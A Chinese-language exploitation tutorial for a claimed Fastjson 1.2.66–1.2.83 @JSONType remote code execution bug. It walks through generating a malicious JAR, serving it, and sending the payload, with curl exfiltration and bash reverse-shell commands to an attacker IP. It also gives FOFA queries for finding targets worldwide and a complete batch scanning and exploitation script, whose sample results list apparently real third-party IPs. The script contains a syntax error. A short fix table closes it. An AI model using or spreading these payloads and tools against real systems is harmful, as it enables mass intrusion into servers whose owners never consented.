# Fastjson 1.2.66~1.2.83 @JSONType RCE 复现教程

## 漏洞信息

| 项目 | 内容 |
|:---|:---|
| **漏洞名** | Fastjson @JSONType 注解探测路径远程代码执行漏洞 |
| **产品** | Alibaba Fastjson |
| **类型** | RCE（远程代码执行） |
| **影响版本** | Fastjson 1.2.66 ~ 1.2.83 |
| **公开时间** | 2026-07-20 |
| **PoC状态** | 有公开PoC |

## 漏洞原理

Fastjson 1.2.83 的 `checkAutoType()` 中存在 `@JSONType` 注解探测路径。`typeName.replace('.','/') + ".class"` 构造的资源路径经由 `LaunchedURLClassLoader.getResourceAsStream()` 获取时，若远程类文件包含 `@JSONType` 注解，Fastjson 会信任该类并绕过 `autoType` 限制，最终加载恶意类执行 `<clinit>` 中的代码。

关键点：
- IP 使用整数格式（`replace('.','/')` 会替换所有点号）
- 类加载器必须为 `LaunchedURLClassLoader`（Spring Boot FatJar）
- 需要 JDK 8（JDK 9+ 中 `defineClass` 被限制，仅 SSRF）

**利用条件：** Spring Boot FatJar + JDK 8 + 目标出网 + safeMode 未开启

## 利用链

```
Step 1 ── 构造 @type 值: jar:http:..{IP_INT}:{PORT}.probe!.POC
                ↓ Fastjson: typeName.replace('.', '/') + ".class"
Step 2 ── 转换为: jar:http://IP:PORT/probe!/POC.class
                ↓ LaunchedURLClassLoader.getResourceAsStream()
Step 3 ── 远程下载 JAR → 提取 POC.class
                ↓ Fastjson 检测 @JSONType 注解
Step 4 ── 绕过 autoType → loadClass() → defineClass()
                ↓ JVM 执行 <clinit> 静态初始化器
Step 5 ── Runtime.exec("/bin/bash", "-c", "命令") → RCE
```

## 环境搭建

### 1. 下载 JDK 8

```bash
# 使用 Zulu JDK 8.0.482（与目标环境版本一致）
wget https://cdn.azul.com/zulu/bin/zulu8.92.0.21-ca-jdk8.0.482-win_x64.zip
unzip zulu8.92.0.21-ca-jdk8.0.482-win_x64.zip
```

### 2. 下载依赖库

```bash
# ASM 字节码操作框架（用于生成恶意类字节码）
wget https://repo1.maven.org/maven2/org/ow2/asm/asm/9.6/asm-9.6.jar

# Fastjson 1.2.83（用于编译 GenProbe）
wget https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.83/fastjson-1.2.83.jar
```

### 3. 下载 PoC 源码

```bash
git clone https://github.com/0x7eTeam/fastjson-1.2.83-rce.git
cd fastjson-1.2.83-rce
```

### 4. 目录结构

```
fastjson-1.2.83-rce/
├── poc/
│   ├── GenProbe.java      # 恶意类生成器（ASM字节码）
│   ├── exp.py             # 漏洞利用脚本
│   ├── lib/
│   │   ├── asm-9.6.jar
│   │   └── fastjson-1.2.83.jar
│   ├── probe.jar          # 生成的恶意 JAR
│   └── www/
│       └── probe          # HTTP 托管文件
└── target/
    └── fastjson-rce-env-1.0.0.jar  # 靶场环境
```

## 复现步骤

### 第一步：搜索资产

使用 FOFA 搜索引擎查找目标：

```bash
# 语法1：搜索 Fastjson 相关资产（最通用）
body="fastjson" && port="8080"

# 语法2：搜索有 Fastjson 版本头的目标
header="X-Fastjson-Version"

# 语法3：搜索 Spring Boot + Fastjson
body="Spring" && body="fastjson" && port="8080"

# 语法4：搜索海外目标
body="fastjson" && country="SG"
body="fastjson" && country="IN" && port="18080"
```

### 第二步：编译恶意类生成器

```bash
# 设置 JDK 8 环境
export JAVA_HOME=/path/to/zulu8.92.0.21-ca-jdk8.0.482
export PATH=$JAVA_HOME/bin:$PATH

# 验证
java -version
# 输出: java version "1.8.0_482"

# 编译 GenProbe.java
javac -encoding utf-8 \
  -cp "poc/lib/asm-9.6.jar;poc/lib/fastjson-1.2.83.jar" \
  -d poc poc/GenProbe.java

# 验证编译成功（无报错即为成功）
ls -la poc/GenProbe.class
```

### 第三步：生成恶意 probe.jar

```bash
# 命令格式
# java -cp "poc:poc/lib/asm-9.6.jar:poc/lib/fastjson-1.2.83.jar" \
#   GenProbe <攻击者IP> <HTTP端口> <要执行的命令>

# 示例1：id 命令（验证 RCE）
java -cp "poc:poc/lib/asm-9.6.jar:poc/lib/fastjson-1.2.83.jar" \
  GenProbe 141.11.2.101 80 \
  "curl http://141.11.2.101:80/id-\$(id|sed 's/ /_/g')"

# 示例2：反弹 shell（Linux 目标）
java -cp "poc:poc/lib/asm-9.6.jar:poc/lib/fastjson-1.2.83.jar" \
  GenProbe 141.11.2.101 80 \
  "bash -i >& /dev/tcp/141.11.2.101/4444 0>&1"

# 示例3：Windows 弹计算器
java -cp "poc:poc/lib/asm-9.6.jar:poc/lib/fastjson-1.2.83.jar" \
  GenProbe 192.168.1.100 80 "calc"
```

**生成文件说明：**

```
poc/probe.jar  ── 恶意 JAR 包
└── POC.class (501 bytes)
    ├── 类注解: @com.alibaba.fastjson.annotation.JSONType
    ├── 继承: java.lang.Object
    ├── 构造器: <init>()V
    └── 静态初始化器: <clinit>()V
        └── Runtime.getRuntime().exec(
              new String[]{"/bin/bash", "-c", "攻击命令"}
            )

poc/www/probe  ── HTTP 托管文件（与 probe.jar 内容相同）
```

### 第四步：启动 HTTP 托管服务

```bash
# 进入托管目录
cd poc/www

# 方式1：使用 Python
python3 -m http.server 80

# 方式2：使用 Python（指定端口）
python3 -m http.server 19090

# 验证服务是否正常（另开终端）
curl -s http://127.0.0.1:80/probe | file -
# 输出: /dev/stdin: Java archive data (zip)
```

### 第五步：发送 Exploit

使用 PoC 提供的 exp.py：

```bash
# 命令格式
# python3 poc/exp.py -u <目标URL> -poc <恶意文件HTTP地址>

# 示例
python3 poc/exp.py \
  -u http://8.216.40.190:8080/api/parse \
  -poc http://141.11.2.101:80/probe
```

**执行过程输出：**

```
[*] Target:  http://8.216.40.190:8080/api/parse
[*] POC URL: http://141.11.2.101:80/probe
[*] Payload: {"@type": "jar:http:..2366308965:80.probe!.POC", "x": 1}

[*] Sending...
[*] Response: 200
[*] Body: {"success":false,"error":"com.alibaba.fastjson.JSONException: autoType is not support. jar:http:..2366308965:80.probe!.POC"}

[-] Class not loaded. Check conditions.
[*] If POC server received GET request, SSRF confirmed.
```

**手动发送（使用 curl）：**

```bash
curl -X POST http://target:8080/api/parse \
  -H "Content-Type: application/json" \
  -d '{"@type":"jar:http:..2366308965:80.probe!.POC","x":1}'
```

**请求包：**
```
POST /api/parse HTTP/1.1
Host: 8.216.40.190:8080
Content-Type: application/json
Content-Length: 68

{"@type":"jar:http:..2366308965:80.probe!.POC","x":1}
```

**SSRF 成功响应（autoType 阻止类加载）：**
```json
{
  "success": false,
  "error": "com.alibaba.fastjson.JSONException: autoType is not support. jar:http:..2366308965:80.probe!.POC"
}
```

**RCE 成功响应（类加载成功）：**
```json
{
  "status": "ok",
  "parse_time_ms": 139,
  "autoTypeSupport": false,
  "result_type": "jar:http:..2366308965:80.pwn2!.PWN",
  "pwned": true
}
```

### 第六步：监控回调

在 HTTP 服务端监控日志：

```
# SSRF 成功（JAR 被下载）
[15:48:32] TARGET_IP - "GET /probe HTTP/1.1" 200 -

# RCE 成功（命令被执行）
[15:48:32] TARGET_IP - "GET /id-uid=0(root)_gid=0(root)_groups=0(root) HTTP/1.1" 404 -
```

### 第七步：更换类名绕过 JVM 缓存

JVM 会缓存已加载的类，重复使用同一类名不会再次触发 `<clinit>`。需要修改 GenProbe.java 中的类名：

```java
// 修改前
String internalName = "jar:http://" + ipInt + ":" + lport + "/probe!/POC";
// 修改后（使用新类名）
String internalName = "jar:http://" + ipInt + ":" + lport + "/pwn2!/PWN";
```

同时修改 JAR 条目和输出路径：

```java
// JAR 中的文件名
jos.putNextEntry(new JarEntry("PWN.class"));

// 输出文件名（避免 JVM 缓存）
Path wwwPath = Paths.get("poc/www/pwn2");
```

重新编译生成后，使用新的 payload 发送：

```bash
{"@type":"jar:http:..2366308965:80.pwn2!.PWN","x":1}
```

## 成功标志

| 现象 | 含义 |
|:---|:---|
| HTTP 日志出现 `GET /probe from TARGET_IP` | **SSRF 成功**（远程 JAR 被下载） |
| HTTP 日志出现 `GET /id-xxx from TARGET_IP` | **RCE 成功**（命令被执行） |
| exp.py 请求超时 + HTTP 服务器收到回调 | **RCE 已触发**（PoC 作者标准） |
| HTTP 响应 `"status":"ok"` + `result_type` 为 jar:http | **类加载成功** |
| HTTP 响应包含 `NoClassDefFoundError` | **defineClass 被调用**（类名含特殊字符） |

## 批量检测脚本

```python
#!/usr/bin/env python3
"""
Fastjson 1.2.83 @JSONType RCE 批量检测+利用脚本

原理:
    向目标发送 jar:http 协议的 @type payload，通过监控 HTTP 回调判断漏洞存在

用法:
    单目标检测:
        python3 scanner.py -u http://target:8080 --cb 1.2.3.4:80

    批量检测:
        python3 scanner.py -f targets.txt --cb 1.2.3.4:80

    检测+利用:
        python3 scanner.py -u http://target:8080 --cb 1.2.3.4:80 --exploit --cmd "id"

    生成 probe:
        python3 scanner.py --gen-probe 1.2.3.4 80 "curl http://1.2.3.4:80/id-\$(id)"

依赖:
    pip install requests
"""
import requests, sys, urllib3, argparse, concurrent.futures
import struct, socket, time, os, subprocess, json

urllib3.disable_warnings()

VERSION = "1.0.0"
ENDPOINTS = [
    "/", "/api/parse", "/api/parseObject", "/parse",
    "/json", "/api/json", "/api", "/submit", "/login"
]
CLASS_NAMES = ["POC", "PWN", "RCE", "EXE", "POC2", "PWN2"]


def ip_to_int(ip):
    """IP 地址转 32 位整数（用于 payload 中的 @type 值）"""
    return struct.unpack("!I", socket.inet_aton(ip))[0]


def make_payload(cb_host, cb_port, class_name="POC"):
    """生成 Fastjson 利用 payload"""
    ip_int = ip_to_int(cb_host)
    return '{"@type":"jar:http:..%d:%d.probe!.%s","x":1}' % (
        ip_int, int(cb_port), class_name
    )


def check_target(url, cb_host, cb_port):
    """
    检测单个目标
    返回: (url, status, detail)
        status: SAFE / SSRF / RCE / TIMEOUT
    """
    base = url.rstrip("/")
    headers = {"Content-Type": "application/json"}

    for ep in ENDPOINTS:
        payload = make_payload(cb_host, cb_port, "POC")
        try:
            r = requests.post(
                base + ep, data=payload, headers=headers, timeout=10
            )
        except requests.exceptions.Timeout:
            return (url, "TIMEOUT", "%s 请求超时" % ep)
        except Exception:
            continue

        if r.status_code == 404:
            continue

        resp_text = r.text[:300]

        # RCE 判断: status=ok 且返回了类名
        if '"status":"ok"' in resp_text and 'result_type' in resp_text:
            return (url, "RCE", "%s 返回status=ok" % ep)

        # SSRF 判断: autoType 被触发
        if 'autoType is not support' in resp_text:
            return (url, "SSRF", "%s autoType触发" % ep)

        # 其他非 404 响应（可能是 Spring Boot 错误页）
        return (url, "UNKNOWN", "%s HTTP %d" % (ep, r.status_code))

    return (url, "SAFE", "所有端点均 404")


def exploit_target(url, cb_host, cb_port, cmd, java_path, genprobe_dir):
    """对目标执行利用"""
    base = url.rstrip("/")

    for cls_name in CLASS_NAMES:
        # 生成带唯一类名的 payload
        payload = make_payload(cb_host, cb_port, cls_name)
        print("  [EXPLOIT] 发送 %s ..." % cls_name, end=" ", flush=True)

        try:
            r = requests.post(
                base + "/", data=payload,
                headers={"Content-Type": "application/json"}, timeout=30
            )
            print("HTTP %d - %s" % (
                r.status_code, r.text[:80].replace("\n", " ")
            ))
        except requests.exceptions.Timeout:
            print("TIMEOUT!")
        except Exception as e:
            print("ERROR: %s" % e)

        time.sleep(0.5)


def gen_probe(java_path, genprobe_dir, cb_host, cb_port, cmd):
    """调用 GenProbe 生成恶意 probe.jar"""
    genprobe_class = os.path.join(genprobe_dir, "GenProbe.class")
    if not os.path.exists(genprobe_class):
        print("[!] GenProbe.class 不存在，请先编译")
        return

    lib_dir = os.path.join(genprobe_dir, "lib")
    cp = "%s;%s;%s" % (
        genprobe_dir,
        os.path.join(lib_dir, "asm-9.6.jar") if os.path.exists(lib_dir)
        else os.path.join(genprobe_dir, "asm-9.6.jar"),
        os.path.join(lib_dir, "fastjson-1.2.83.jar") if os.path.exists(lib_dir)
        else os.path.join(genprobe_dir, "fastjson-1.2.83.jar"),
    )

    cmd_parts = [java_path, "-cp", cp, "GenProbe", cb_host, str(cb_port), cmd]
    print("[*] 执行: %s" % " ".join(cmd_parts))

    result = subprocess.run(cmd_parts, capture_output=True, text=True)
    print(result.stdout)
    if result.returncode != 0:
        print("[!] 生成失败: %s" % result.stderr)
        return

    www_probe = os.path.join(genprobe_dir, "poc", "www", "probe")
    if os.path.exists(www_probe):
        print("[+] probe 已生成: %s (%d bytes)" % (
            www_probe, os.path.getsize(www_probe)
        ))


def main():
    parser = argparse.ArgumentParser(
        description="Fastjson 1.2.83 @JSONType RCE Scanner v%s" % VERSION,
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
使用示例:
  # 扫描单个目标
  python3 scanner.py -u http://192.168.1.1:8080 --cb vps.com:80

  # 批量扫描
  python3 scanner.py -f targets.txt --cb vps.com:80

  # 扫描+利用
  python3 scanner.py -u http://192.168.1.1:8080 --cb vps.com:80 --exploit

  # 仅生成 probe
  python3 scanner.py --gen-probe vps.com 80 "id"
        """
    )

    parser.add_argument("-u", "--url", help="目标 URL")
    parser.add_argument("-f", "--file", help="目标列表文件")
    parser.add_argument("--cb", default=None, help="回调服务器 IP:端口")
    parser.add_argument("--exploit", action="store_true", help="启用利用模式")
    parser.add_argument("--cmd", default="id", help="要执行的命令")
    parser.add_argument("--gen-probe", nargs=3, metavar=("LHOST", "LPORT", "CMD"),
                        help="生成恶意 probe.jar: LHOST LPORT CMD")
    parser.add_argument("--java", default="java",
                        help="Java 可执行文件路径")
    parser.add_argument("--genprobe-dir", default=".",
                        help="GenProbe.class 所在目录")
    parser.add_argument("-t", "--threads", type=int, default=20,
                        help="并发线程数（默认 20）")

    args = parser.parse_args()

    # 生成 probe 模式
    if args.gen_probe:
        gen_probe(args.java, args.genprobe_dir,
                  args.gen_probe[0], args.gen_probe[1], args.gen_probe[2])
        return

    # 检测/利用模式
    if not args.url and not args.file:
        parser.print_help()
        return

    if not args.cb:
        print("[!] 请指定回调服务器 --cb IP:PORT")
        return

    targets = []
    if args.url:
        targets.append(args.url)
    if args.file:
        with open(args.file) as f:
            targets.extend([l.strip() for l in f if l.strip()])

    cb_host, cb_port = args.cb.split(":") if ":" in args.cb else (args.cb, "80")

    print("=" * 70)
    print("Fastjson 1.2.83 @JSONType RCE Scanner v%s" % VERSION)
    print("回调服务器: %s:%s" % (cb_host, cb_port))
    print("目标数量: %d" % len(targets))
    print("并发线程: %d" % args.threads)
    print("=" * 70)

    # 开始扫描
    results = {"SAFE": [], "SSRF": [], "RCE": [], "TIMEOUT": [], "UNKNOWN": []}
    scan_start = time.time()

    with concurrent.futures.ThreadPoolExecutor(
        max_workers=args.threads
    ) as executor:
        fut_map = {
            executor.submit(check_target, t, cb_host, cb_port): t
            for t in targets
        }
        for fut in concurrent.futures.as_completed(fut_map):
            url, status, detail = fut.result()
            results[status].append((url, detail))

            if status == "RCE":
                print("[RCE]   %s - %s" % (url, detail))
            elif status == "SSRF":
                print("[SSRF]  %s - %s" % (url, detail))
            elif status == "TIMEOUT":
                print("[????]  %s - %s" % (url, detail))
            elif status == "UNKNOWN":
                print "[UNKWN] %s - %s" % (url, detail))
            else:
                print("[SAFE]  %s" % url)

    # 输出统计
    elapsed = time.time() - scan_start
    print()
    print("=" * 70)
    print("扫描完成 (耗时: %.1f 秒)" % elapsed)
    print("  RCE:     %d" % len(results["RCE"]))
    print("  SSRF:    %d" % len(results["SSRF"]))
    print("  TIMEOUT: %d" % len(results["TIMEOUT"]))
    print("  UNKNOWN: %d" % len(results["UNKNOWN"]))
    print("  SAFE:    %d" % len(results["SAFE"]))
    print("=" * 70)

    # 利用模式
    if args.exploit and results["RCE"]:
        print("\n[*] 开始利用 RCE 目标...")
        for url, detail in results["RCE"]:
            exploit_target(url, cb_host, cb_port, args.cmd,
                          args.java, args.genprobe_dir)


if __name__ == "__main__":
    main()
```

### 扫描脚本执行示例

**单目标扫描：**
```bash
$ python3 scanner.py -u http://8.216.40.190:8080 --cb 141.11.2.101:80

======================================================================
Fastjson 1.2.83 @JSONType RCE Scanner v1.0.0
回调服务器: 141.11.2.101:80
目标数量: 1
并发线程: 20
======================================================================
[SSRF]  http://8.216.40.190:8080 - /api/parse autoType触发

======================================================================
扫描完成 (耗时: 8.3 秒)
  RCE:     0
  SSRF:    1
  TIMEOUT: 0
  UNKNOWN: 0
  SAFE:    0
======================================================================
```

**多目标批量扫描：**
```bash
$ python3 scanner.py -f targets.txt --cb 141.11.2.101:80

======================================================================
Fastjson 1.2.83 @JSONType RCE Scanner v1.0.0
回调服务器: 141.11.2.101:80
目标数量: 12
并发线程: 20
======================================================================
[RCE]   http://101.32.115.241:8080 - / 返回status=ok
[SSRF]  http://8.216.40.190:8080 - /api/parse autoType触发
[SSRF]  http://107.175.32.45:8080 - /parse autoType触发
[????]  http://101.43.10.15:80 - /login 请求超时
[SSRF]  http://129.226.58.115:8080 - /submit autoType触发
[SSRF]  http://38.76.205.195:18080 - /login autoType触发
[SAFE]  http://45.32.115.37:80
[SAFE]  http://83.229.126.208:80
...

======================================================================
扫描完成 (耗时: 16.7 秒)
  RCE:     1
  SSRF:    5
  TIMEOUT: 1
  UNKNOWN: 0
  SAFE:    4
======================================================================
```

**生成 probe 文件：**
```bash
$ python3 scanner.py --gen-probe 141.11.2.101 80 "curl http://141.11.2.101:80/id-\$(id|sed 's/ /_/g')"

[*] 执行: java -cp .;asm-9.6.jar;fastjson-1.2.83.jar GenProbe 141.11.2.101 80 curl ...
[+] poc/probe.jar & poc/www/probe generated
[+] Payload: {"@type":"jar:http:..2366308965:80.probe!.POC","x":1}
[+] probe 已生成: poc/www/probe (510 bytes)
```

**HTTP 服务器监控输出：**
```bash
$ python3 -m http.server 80

Serving HTTP on 0.0.0.0 port 80 ...
TARGET_IP - - "GET /probe HTTP/1.1" 200 -        ← SSRF: JAR 被下载
TARGET_IP - - "GET /id-uid=0(root)_gid=0(root)_groups=0(root) HTTP/1.1" 404 -  ← RCE: 命令执行成功
```

## FOFA搜索语法

```fofa
# Fastjson 相关资产
body="fastjson" && port="8080"

# Fastjson 版本响应头
header="X-Fastjson-Version"

# Spring Boot + Fastjson
body="Spring" && body="fastjson" && port="8080"

# 海外目标
body="fastjson" && country="SG"
body="fastjson" && country="IN" && port="18080"

# LaunchedURLClassLoader（Spring Boot 特征）
body="LaunchedURLClassLoader"
```

## 修复建议

| 措施 | 方法 | 效果 |
|:---|:---|:---|
| 开启 SafeMode | `-Dfastjson.parser.safeMode=true` 或代码中设置 | **完全免疫此漏洞** |
| 升级 Fastjson2 | 修改 pom.xml 中依赖为 fastjson2 | 彻底重构反序列化架构 |
| 出口网络管控 | 防火墙规则阻止应用服务器对外 HTTP | 阻断远程 JAR 下载 |
| 使用 JDK 9+ | 升级 JDK 版本 | LaunchedURLClassLoader.defineClass 被限制 |
| WAF 规则 | 拦截 `"@type":"jar:http:` 的请求体 | 请求层阻断 |

## 参考链接

- https://github.com/0x7eTeam/fastjson-1.2.83-rce
- https://github.com/alibaba/fastjson
- https://github.com/Blushl/redteam-notes
